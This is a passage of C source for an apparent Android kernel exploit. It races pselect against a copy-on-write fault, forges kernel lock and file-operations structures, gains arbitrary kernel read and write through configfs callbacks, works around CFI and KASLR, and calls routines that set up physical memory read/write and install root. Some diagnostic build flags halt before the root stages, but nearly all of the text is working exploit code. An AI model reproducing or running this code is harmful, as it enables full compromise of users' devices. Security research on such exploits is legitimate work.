     * mprotect phase and the gated pselect transition. */
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    rmg_diag_checkpoint_defer(1);
#endif
    atomic_store_explicit(&monitor.armed, 1, memory_order_release);
    while (!atomic_load_explicit(&monitor.sample_ready,
                                 memory_order_acquire))
      __asm__ volatile("yield" ::: "memory");
    rmg_diag_checkpoint("readiness-monitor-sample-before-mprotect",
                        monitor.tid, monitor.first_state);
    /* Release the helper only when the waiter is ready to enter pselect. In
     * ordinary trace builds, wait for its pre-syscall marker. The delayed
     * observer build instead starts pselect immediately so mprotect can
     * overlap its output copy. */
    atomic_store_explicit(&cow_ctx.release_mprotect, 1,
                          memory_order_release);
#if !defined(RMG_DIAG_COW_MPROTECT_DELAY_USEC) || \
    RMG_DIAG_COW_MPROTECT_DELAY_USEC <= 0
    while (!atomic_load_explicit(&cow_ctx.mprotect_started,
                                 memory_order_acquire))
      __asm__ volatile("yield" ::: "memory");
#endif
#endif
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    rmg_diag_checkpoint("readiness-cow-entered", route_attempt, 0);
#endif
#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
    readiness_trace_mark(READINESS_TRACE_COW_ENTERED, 0);
#endif
    long long headstart_until =
        readiness_now_us() + READINESS_LOCK_HEADSTART_USEC;
    while (readiness_now_us() < headstart_until)
      __asm__ volatile("yield" ::: "memory");

    if (atomic_load_explicit(&monitor.pre_gate_block,
                             memory_order_acquire)) {
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
      rmg_diag_checkpoint("readiness-pselect-abort-pre-gate-block",
                          route_attempt, 'D');
#endif
#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
      atomic_store_explicit(&cow_ctx.stop_mprotect, 1,
                            memory_order_release);
#endif
      atomic_store_explicit(&monitor.stop, 1, memory_order_release);
      pthread_join(mmap_locker, NULL);
      pthread_join(block_monitor, NULL);
#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
      readiness_log_block_wchan_snapshot(&monitor);
      readiness_log_locker_block_wchan_snapshot(&monitor);
#endif
#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
      readiness_log_locker_monitor_summary(&monitor);
#endif
#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
      readiness_trace_flush(route_attempt);
      readiness_mprotect_trace_flush(route_attempt);
      readiness_log_cow_pagemap("pre-pselect", cow_pagemap_before_ret,
                                cow_pagemap_before_errno,
                                cow_pagemap_before_entry);
#endif
      munmap(cow_ctx.region, cow_ctx.region_len);
      munmap(cow_out, cow_len);
      close(cow_fd);
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
      rmg_diag_checkpoint_defer(0);
#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
      readiness_checkpoint_block_sample(&monitor);
      readiness_checkpoint_locker_block_sample(&monitor);
#endif
      rmg_diag_checkpoint("readiness-pselect-abort-pre-gate-block",
                          route_attempt, 'D');
      rmg_diag_checkpoint("readiness-monitor-summary", monitor.polls,
                          monitor.last_state);
      rmg_diag_checkpoint("readiness-mprotect-summary",
                          (unsigned long long)cow_ctx.ret,
                          (unsigned long long)cow_ctx.elapsed_us);
#endif
#if defined(RMG_DIAG_READINESS_STATE_TRACE)
      readiness_monitor_state_flush(&monitor, route_attempt);
#endif
      route_pi_sanitize();
      break;
    }

    /* The monitor calls sched_setattr only after /proc reports the waiter
     * in TASK_UNINTERRUPTIBLE, which can only be the blocked COW fault in
     * this ready-pselect path. */
#if !defined(RMG_DIAG_COW_TRACE) || !RMG_DIAG_COW_TRACE
    atomic_store_explicit(&monitor.armed, 1, memory_order_release);
#endif
#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
    readiness_trace_mark(READINESS_TRACE_PSELECT_BEFORE, 0);
#endif
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    rmg_diag_checkpoint("readiness-pselect-start", route_attempt, page_base);
#endif
    atomic_store_explicit(&monitor.trigger_gate, 1, memory_order_release);
#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
    readiness_trace_mark(READINESS_TRACE_TRIGGER_GATE_OPEN, 0);
#endif
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    rmg_diag_checkpoint("readiness-monitor-trigger-gate-open",
                        route_attempt, page_base);
#endif
#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
    atomic_store_explicit(&monitor.pselect_call_started, 1,
                          memory_order_release);
#endif
    atomic_store_explicit(&monitor.pselect_active, 1, memory_order_release);
    long long pselect_start_us = readiness_now_us();
    long ret = readiness_pselect_asm(
        PSELECT_ROUTE_NFDS, NULL, cow_out, NULL);
    long long pselect_us = readiness_now_us() - pselect_start_us;
    /* Disarm the monitor before the COW trace reads pagemap and smaps. Those
     * proc-file reads can themselves show D in wchan. */
    atomic_store_explicit(&monitor.pselect_active, 0, memory_order_release);
    atomic_store_explicit(&monitor.stop, 1, memory_order_release);
    atomic_store_explicit(&cow_ctx.stop_mprotect, 1, memory_order_release);
#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
    readiness_trace_mark(READINESS_TRACE_PSELECT_AFTER, (int)ret);
    errno = 0;
    pagemap_ret = readiness_read_pagemap_entry(cow_out,
                                                &cow_pagemap_entry);
    pagemap_errno = pagemap_ret == 0 ? 0 : errno;
    readiness_read_smaps(cow_out, &smaps_after_pselect);
    if (pagemap_ret == 0) {
      /* After the pselect observation, write a byte at the end of its
       * mapped page to calibrate soft-dirty/pagemap on this exact mapping.
       * This is deliberately after the timing-sensitive operation and
       * cannot affect the result fd_set words inspected below. */
      size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
      if (page_size > 0) {
        volatile unsigned char *probe =
            (volatile unsigned char *)cow_out + page_size - 1;
        unsigned char value = *probe;
        *probe = (unsigned char)(value ^ 1U);
        soft_dirty_control_write = 0;
        errno = 0;
        soft_dirty_control_pagemap_ret =
            readiness_read_pagemap_entry(cow_out,
                                         &cow_control_pagemap_entry);
        soft_dirty_control_pagemap_errno =
            soft_dirty_control_pagemap_ret == 0 ? 0 : errno;
      }
    }
    readiness_read_smaps(cow_out, &smaps_after_control);
#endif
    atomic_store(&punch_consume_go, 0);

    pthread_join(mmap_locker, NULL);
    pthread_join(block_monitor, NULL);
#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
    readiness_log_block_wchan_snapshot(&monitor);
    readiness_log_locker_block_wchan_snapshot(&monitor);
#endif
#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
    readiness_log_locker_monitor_summary(&monitor);
#endif
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    rmg_diag_checkpoint_defer(0);
#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
    readiness_checkpoint_block_sample(&monitor);
    readiness_checkpoint_locker_block_sample(&monitor);
#else
    if (monitor.post_pselect_block)
      rmg_diag_checkpoint("readiness-monitor-block-after-pselect",
                          monitor.tid, monitor.post_pselect_block_polls);
#endif
    rmg_diag_checkpoint("readiness-pselect-done", route_attempt,
                        (unsigned long long)ret);
    rmg_diag_checkpoint("readiness-pselect-time", route_attempt,
                        (unsigned long long)pselect_us);
    rmg_diag_checkpoint("readiness-monitor-summary", monitor.polls,
                        monitor.last_state);
    rmg_diag_checkpoint("readiness-sched-summary",
                        (unsigned long long)monitor.sched_ret,
                        (unsigned long long)monitor.sched_errno);
    rmg_diag_checkpoint("readiness-mprotect-summary",
                        (unsigned long long)cow_ctx.ret,
                        (unsigned long long)cow_ctx.elapsed_us);
#endif
#if defined(RMG_DIAG_READINESS_STATE_TRACE)
    readiness_monitor_state_flush(&monitor, route_attempt);
#endif
#if defined(RMG_DIAG_PASSIVE_COW_OBSERVER) && RMG_DIAG_PASSIVE_COW_OBSERVER
    pr_info("COWPASSIVE attempt=%d observer_core=%d helper_predicted=%d "
            "inherited=%016llx allowed=%016llx effective=%016llx "
            "samples=%llu first_state=%d first_at_us=%lld "
            "first_observer_cpu=%d last_state=%d last_at_us=%lld "
            "last_observer_cpu=%d affinity_errno=%d\n",
            route_attempt, monitor.observer_core, monitor.helper_core,
            monitor.observer_inherited_affinity,
            monitor.observer_allowed_affinity,
            monitor.observer_effective_affinity,
            monitor.pselect_state_samples, monitor.pselect_first_state,
            monitor.pselect_first_sample_us,
            monitor.pselect_first_observer_cpu, monitor.pselect_last_state,
            monitor.pselect_last_sample_us,
            monitor.pselect_last_observer_cpu,
            monitor.observer_affinity_errno);
#endif
#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
    readiness_trace_flush(route_attempt);
    readiness_mprotect_trace_flush(route_attempt);
    readiness_log_cow_pagemap("pre-pselect", cow_pagemap_before_ret,
                              cow_pagemap_before_errno,
                              cow_pagemap_before_entry);
    readiness_log_cow_pagemap("post-pselect", pagemap_ret, pagemap_errno,
                              cow_pagemap_entry);
    readiness_probe_anon_soft_dirty(&anon_soft_dirty);
    pr_info("readiness COW proof soft_dirty_clear=%d/%d pagemap=%d/%d "
            "entry=%016llx dirty=%d control_write=%d control_pagemap=%d/%d "
            "control_entry=%016llx control_dirty=%d anon_map=%d/%d "
            "anon_clear=%d/%d anon_before=%d/%d:%016llx/%d "
            "anon_write=%d anon_after=%d/%d:%016llx/%d "
            "smaps_before=%d/%d:%llu/%llu "
            "smaps_after=%d/%d:%llu/%llu "
            "smaps_control=%d/%d:%llu/%llu monitor_polls=%llu "
            "blocked_samples=%llu first_state=%d last_state=%d\n",
            soft_dirty_clear_ret, soft_dirty_clear_errno, pagemap_ret,
            pagemap_errno, cow_pagemap_entry,
            (int)((cow_pagemap_entry >> 55) & 1ULL),
            soft_dirty_control_write, soft_dirty_control_pagemap_ret,
            soft_dirty_control_pagemap_errno, cow_control_pagemap_entry,
            (int)((cow_control_pagemap_entry >> 55) & 1ULL),
            anon_soft_dirty.map_ret, anon_soft_dirty.map_errno,
            anon_soft_dirty.clear_ret, anon_soft_dirty.clear_errno,
            anon_soft_dirty.before_ret, anon_soft_dirty.before_errno,
            anon_soft_dirty.before_entry,
            (int)((anon_soft_dirty.before_entry >> 55) & 1ULL),
            anon_soft_dirty.write_ret, anon_soft_dirty.after_ret,
            anon_soft_dirty.after_errno, anon_soft_dirty.after_entry,
            (int)((anon_soft_dirty.after_entry >> 55) & 1ULL),
            smaps_before.ret, smaps_before.err,
            smaps_before.anonymous_kb, smaps_before.private_dirty_kb,
            smaps_after_pselect.ret, smaps_after_pselect.err,
            smaps_after_pselect.anonymous_kb,
            smaps_after_pselect.private_dirty_kb,
            smaps_after_control.ret, smaps_after_control.err,
            smaps_after_control.anonymous_kb,
            smaps_after_control.private_dirty_kb, monitor.polls,
            monitor.blocked_samples, monitor.first_state,
            monitor.last_state);
#endif

    uint64_t cow_w1 = 0, cow_w2 = 0, cow_w3 = 0;
    memcpy(&cow_w1, (char *)cow_out + 1 * 8, 8);
    memcpy(&cow_w2, (char *)cow_out + 2 * 8, 8);
    memcpy(&cow_w3, (char *)cow_out + 3 * 8, 8);
    uint64_t want_w3 = (uint64_t)(page_base + LOCK_OFF + 0x100);
    /* The walk's [7] writes waiter->prio in place, so a successful walk
     * deliberately changes the low 32 bits of result word 3 (observed as
     * 0x78). Word 3 was already verified by the preflight select; after the
     * walk only task and lock must remain exact. */
    int overlay_ok = cow_w1 == (uint64_t)fake_task &&
                     cow_w2 == (uint64_t)fake_lock;

    munmap(cow_ctx.region, cow_ctx.region_len);
    munmap(cow_out, cow_len);
    close(cow_fd);
    route_pi_sanitize();

    {
      char m[384];
      int n = snprintf(m, sizeof(m),
          "[OVERLAY] readiness-cow ret=%ld pselect_us=%lld "
          "mprotect=%d/%d lock_us=%lld blocked=%d sched=%ld/%d overlay=%d "
          "w1=%016llx w2=%016llx w3=%016llx want3=%016llx\n",
          ret, pselect_us, cow_ctx.ret, cow_ctx.err, cow_ctx.elapsed_us,
          atomic_load(&monitor.saw_block), monitor.sched_ret,
          monitor.sched_errno, overlay_ok,
          (unsigned long long)cow_w1,
          (unsigned long long)cow_w2, (unsigned long long)cow_w3,
          (unsigned long long)want_w3);
      syscall(SYS_write, 2, m, n);
    }

    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("readiness-cow walk attempt=%d/%d calls=%d success=%d walk_us=%d\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, calls, success,
            atomic_load(&consumer_walk_us));
#if defined(RMG_DIAG_UCLAMP_TRIGGER_ONLY) && RMG_DIAG_UCLAMP_TRIGGER_ONLY
    int canary_mutated = route_payload_canary();
#else
    (void)route_payload_canary();
#endif

    int route_signal = atomic_load(&monitor.saw_block) && overlay_ok &&
                       calls > 0 && success > 0;
#if defined(RMG_DIAG_UCLAMP_TRIGGER_ONLY) && RMG_DIAG_UCLAMP_TRIGGER_ONLY
    int fops_readback_ok = 0;
    int fops_readback_step = 0;
    rmg_diag_checkpoint("uclamp-trigger-canary", canary_mutated, 0);
    if (canary_mutated) {
      fops_readback_ok = try_ashmem_fops_readback();
      fops_readback_step = cfi_last_step;
    } else {
      rmg_diag_checkpoint("uclamp-trigger-fops-skipped", 0, 0);
    }
    rmg_diag_checkpoint("uclamp-trigger-fops-gate", fops_readback_ok,
                        fops_readback_step);
    /* This build always stops here. Even a positive readback only records
     * evidence; it never authorizes CFI, pipe physical-RW, or root. */
    rmg_diag_checkpoint("uclamp-trigger-stop-before-cfi", canary_mutated,
                        fops_readback_ok);
    cfi_last_step = 42;
    cfi_last_errno = 0;
    route_signal = 0;
#endif
#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
    route_signal = 0;
#endif
#if defined(RMG_DIAG_PI_PROBE_ONLY) && RMG_DIAG_PI_PROBE_ONLY && \
    !(defined(RMG_DIAG_CFI_ONLY) && RMG_DIAG_CFI_ONLY)
    /* A successful PI trigger is diagnostic only: do not enter CFI, pipe
     * physical-RW, or root installation on this build. */
    route_signal = 0;
#endif
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    rmg_diag_checkpoint("readiness-route-signal", route_attempt,
                        route_signal);
    rmg_diag_checkpoint("readiness-cow-only-stop-before-cfi", route_attempt,
                        overlay_ok);
#endif
    if (route_signal) {
      /* The readiness bitmap is no longer needed after the walk. Shrink the
       * shell uid's pipe-page charge before allocating the much larger
       * physrw reclaim population. */
      route_craft_close_all();
      int probe_fd = open(ashmem_path, O_RDWR | O_CLOEXEC);
      pr_info("fops probe: open fd=%d errno=%d\n", probe_fd, errno);
      if (probe_fd >= 0)
        close(probe_fd);

      if (skip_cfi_stage) {
        route_verified = 1;
        cfi_last_step = 0;
      } else if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    } else {
#if !defined(RMG_DIAG_UCLAMP_TRIGGER_ONLY) || \
    !RMG_DIAG_UCLAMP_TRIGGER_ONLY
      cfi_last_step = 33;
      cfi_last_errno = 0;
#endif
    }

#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    rmg_diag_checkpoint("readiness-attempt-end", route_attempt,
                        route_verified);
    rmg_diag_checkpoint("readiness-attempt-status", cfi_last_step,
                        cfi_last_errno);
#endif

    if (route_verified || cfi_dirty_seen) {
      break;
    }
    pr_info("readiness-cow cfi miss attempt=%d/%d step=%d errno=%d\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_step,
            cfi_last_errno);
  }
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("readiness-route-done", calls, success);
  rmg_diag_checkpoint("readiness-route-status", cfi_last_step,
                      cfi_last_errno);
#endif
  pr_info("readiness-cow route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}

#else /* !ROUTE_READINESS_SPRAY */

void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  int calls = 0;
  int success = 0;
  int route_verified = 0;
  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
       route_attempt++) {
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
                 "lock=%016zx fops=%016zx\n",
                 route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }

    int pipefd[2];
    SYSCHK(pipe(pipefd));
    int high_read = fcntl(pipefd[0], F_DUPFD, PSELECT_ROUTE_NFDS + 16);
    if (high_read < 0) {
      cfi_last_step = 31;
      cfi_last_errno = errno;
      pr_error("pselect F_DUPFD read errno=%d\n", errno);
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }

    fd_set in;
    fd_set out;
    fd_set ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    int delay_usec = route_delay_usec(route_attempt);
    atomic_store(&main_route_delay_usec, delay_usec);
    atomic_store(&punch_consume_go, route_attempt);

    struct timespec timeout = {
      .tv_sec = PSELECT_TIMEOUT_SEC,
      .tv_nsec = 0,
    };
    struct timespec *timeoutp = &timeout;

    errno = 0;
    int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, timeoutp, NULL);
    int saved_errno = errno;
    atomic_store(&punch_consume_go, 0);
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d\n",
            route_attempt, ret, saved_errno, calls, success, delay_usec);

    int route_signal = calls > 0 && success > 0;
    if (route_signal) {
      if (skip_cfi_stage) {
        route_verified = 1;
        cfi_last_step = 0;
        pr_info("skip_cfi_stage: accepting route as verified\n");
      } else if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    } else if (!route_verified) {
      cfi_last_step = 33;
      cfi_last_errno = saved_errno;
    }

    close(high_read);
    close(pipefd[0]);
    close(pipefd[1]);

    if (route_verified || cfi_dirty_seen) {
      break;
    }
    pr_info("pselect cfi miss attempt=%d/%d step=%d errno=%d; refreshing FOPS page\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_step,
            cfi_last_errno);
  }
  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}

#endif /* ROUTE_READINESS_SPRAY */

int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = text_addr(NOOP_LLSEEK_CFI);
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

int restore_slide_boot_id(int fd) {
  uintptr_t boot_id_data_ptr =
      SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset;
  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  configfs_read_once(
      fd, boot_id_data_ptr, &slide_bootid_before, sizeof(slide_bootid_before));
  slide_bootid_restore_ret =
    configfs_write_once(
        fd, boot_id_data_ptr, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(
      fd, boot_id_data_ptr, &slide_bootid_after, sizeof(slide_bootid_after));
  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after, errno);
  int boot_id_restored =
      slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
      slide_bootid_after == slide_bootid_want;

#ifdef SLIDE_RB_PARENT_TYPE_RESTORE
  uintptr_t parent_type = SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset +
                          sizeof(uint64_t);
  uint64_t type_before = 0;
  uint64_t type_after = 0;
  uint64_t type_want = SLIDE_RB_PARENT_TYPE_RESTORE;
  configfs_read_once(fd, parent_type, &type_before, sizeof(type_before));
  ssize_t type_restore_ret =
      configfs_write_once(fd, parent_type, &type_want, sizeof(type_want));
  configfs_read_once(fd, parent_type, &type_after, sizeof(type_after));
  pr_info("slide restore rb parent type pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), type_restore_ret,
          (unsigned long long)type_before,
          (unsigned long long)type_want,
          (unsigned long long)type_after, errno);
  return boot_id_restored &&
         type_restore_ret == (ssize_t)sizeof(type_want) &&
         type_after == type_want;
#else
  return boot_id_restored;
#endif
}

int restore_slide_boot_id_pipe(int fd) {
  /* The tracefs slide path does not dirty these globals, but restoring the
   * expected values is harmless. Use canonical configfs access while the
   * forged fops is still installed; the old P0 aliases used guessed physical
   * translations and wrote unrelated RAM. */
  uintptr_t boot_id_data_ptr =
      canon_addr(SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE);
  slide_bootid_want = canon_addr(SLIDE_SYSCTL_BOOTID_IMAGE);
  configfs_read_once(fd, boot_id_data_ptr, &slide_bootid_before,
                     sizeof(slide_bootid_before));
  slide_bootid_restore_ret = configfs_write_once(
      fd, boot_id_data_ptr, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(fd, boot_id_data_ptr, &slide_bootid_after,
                     sizeof(slide_bootid_after));
  pr_info("slide restore boot_id canonical pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after);
  int boot_id_restored =
      slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
      slide_bootid_after == slide_bootid_want;

#ifdef SLIDE_RB_PARENT_TYPE_RESTORE
  uintptr_t parent_type =
      canon_addr(SLIDE_NFULNL_LOGGER_OBJECT_IMAGE) + sizeof(uint64_t);
  uint64_t type_before = 0;
  uint64_t type_after = 0;
  uint64_t type_want = SLIDE_RB_PARENT_TYPE_RESTORE;
  configfs_read_once(fd, parent_type, &type_before, sizeof(type_before));
  ssize_t type_ret = configfs_write_once(
      fd, parent_type, &type_want, sizeof(type_want));
  configfs_read_once(fd, parent_type, &type_after, sizeof(type_after));
  pr_info("slide restore rb parent canonical pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx\n",
          getpid(), type_ret,
          (unsigned long long)type_before,
          (unsigned long long)type_want,
          (unsigned long long)type_after);
  return boot_id_restored &&
         type_ret == (ssize_t)sizeof(type_want) && type_after == type_want;
#else
  return boot_id_restored;
#endif
}

int install_child_root(int fd) {
#if defined(RMG_DIAG_UCLAMP_TRIGGER_ONLY) && RMG_DIAG_UCLAMP_TRIGGER_ONLY
  (void)fd;
  pr_warning("uclamp-trigger-only guard: refusing pipe physical-RW and root\n");
  return 0;
#else
  return install_pipe_physrw(fd) && install_android_root(fd);
#endif
}

#if defined(RMG_DIAG_FOPS_READBACK_ONLY) && RMG_DIAG_FOPS_READBACK_ONLY
static int try_ashmem_fops_readback(void) {
  uint64_t observed_fops = 0;
  uintptr_t fops_slot = canon_addr(ASHMEM_MISC_FOPS);
  errno = 0;
  rmg_diag_checkpoint("fops-readback-start", fops_slot, fake_fops);
  ssize_t n = configfs_read_once(-1, fops_slot, &observed_fops,
                                 sizeof(observed_fops));
  int read_errno = errno;
  rmg_diag_checkpoint("fops-readback-result",
                      (unsigned long long)(long long)n, read_errno);
  rmg_diag_checkpoint("fops-readback-value", observed_fops, fake_fops);
  pr_info("ashmem fops readback ret=%zd errno=%d observed=%016llx "
          "expected=%016zx\n",
          n, read_errno, (unsigned long long)observed_fops, fake_fops);
  if (n != (ssize_t)sizeof(observed_fops)) {
    cfi_last_step = 40;
    cfi_last_errno = read_errno;
    return 0;
  }
  if ((uintptr_t)observed_fops != fake_fops) {
    cfi_last_step = 41;
    cfi_last_errno = 0;
    return 0;
  }
  cfi_last_step = 0;
  cfi_last_errno = 0;
  return 1;
}
#endif

int try_cfi_stage(void) {
#if defined(RMG_DIAG_UCLAMP_TRIGGER_ONLY) && RMG_DIAG_UCLAMP_TRIGGER_ONLY
  cfi_last_step = 42;
  cfi_last_errno = 0;
  pr_warning("uclamp-trigger-only guard: refusing CFI stage\n");
  return 0;
#elif defined(RMG_DIAG_FOPS_READBACK_ONLY) && RMG_DIAG_FOPS_READBACK_ONLY
  /* Read only ashmem_misc.fops through the existing configfs read callback.
   * Do not attempt the CFI write, pipe physical-RW, or root stages. */
  return try_ashmem_fops_readback();
#else
#if defined(RMG_DIAG_PI_PROBE_ONLY) && RMG_DIAG_PI_PROBE_ONLY && \
    !(defined(RMG_DIAG_CFI_ONLY) && RMG_DIAG_CFI_ONLY)
  cfi_last_step = 33;
  cfi_last_errno = 0;
  pr_warning("PI-probe-only guard: refusing CFI/root stages\n");
  return 0;
#endif
  cfi_attempts++;
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("cfi-stage-start", cfi_attempts, getpid());
#endif
  int fd = open_ashmem_device();

  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    rmg_diag_checkpoint("cfi-stage-open-failed", cfi_last_step,
                        cfi_last_errno);
#endif
    return 0;
  }

  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  ssize_t n =
    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  int write_errno = errno;
  cfi_write_ret = n;
  pr_info("cfi write ret=%zd errno=%d\n", n, write_errno);
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("cfi-stage-write", (unsigned long long)n,
                      write_errno);
#endif
  if (n != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = write_errno;
    goto fail;
  }
  cfi_dirty_seen = 1;

  if (!repair_fake_fops_llseek(fd)) {
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }
  cfi_read_slot_ret = sizeof(uint64_t);

  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r =
    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  int read_errno = errno;
  cfi_read_ret = r;
  pr_info("cfi read ret=%zd errno=%d\n", r, read_errno);
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("cfi-stage-read", (unsigned long long)r,
                      read_errno);
#endif
  if (r != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = read_errno;
    goto fail;
  }

  if (!kaslr_done) {
    cfi_last_step = 9;
    cfi_last_errno = errno;
    goto fail;
  }

#if defined(RMG_DIAG_PIPE_AFTER_CFI) && RMG_DIAG_PIPE_AFTER_CFI
  /* Run the pipe-page oracle only after the normal route has validated the
   * forged ashmem read callback. The main-route thread owns this preparation
   * point; stop here before physical read/write or root installation. */
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("pipe-after-cfi-start", cfi_read_ret, 0);
#endif
  atomic_store(&pipe_prepare_done, 0);
  atomic_store(&pipe_prepare_request, 1);
  int pipe_waited = 0;
  /* This preparation can itself need more than two minutes on this device;
   * allow up to ten minutes while the enclosing RMG run has a 15-minute cap. */
  for (; pipe_waited < 60000; pipe_waited++) {
    if (atomic_load(&pipe_prepare_done))
      break;
    usleep(10000);
  }
  if (pipe_waited == 60000) {
    cfi_last_step = 36;
    cfi_last_errno = ETIMEDOUT;
    pr_error("route-timed pipe diagnostic timed out\n");
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    rmg_diag_checkpoint("pipe-after-cfi-timeout", pipe_waited, 0);
#endif
    goto fail;
  }
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("cfi-stage-pipe-return", pipebuf_page_base,
                      pipe_waited);
#endif
#if RMG_DIAG_PIPE_PHYSRW_ONLY
  /* Return through fail cleanup before install_android_root() can run. */
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("pipe-physrw-only-start", pipebuf_page_base,
                      pipebuf_pipe_idx);
#endif
#if RMG_DIAG_PIPE_RECLAIM_TRACE
#if RMG_DIAG_PIPE_PHYSRW_PROOF_AFTER_CORRELATION
  int physrw_only_ok = run_pipe_reclaim_physrw_diagnostic(fd);
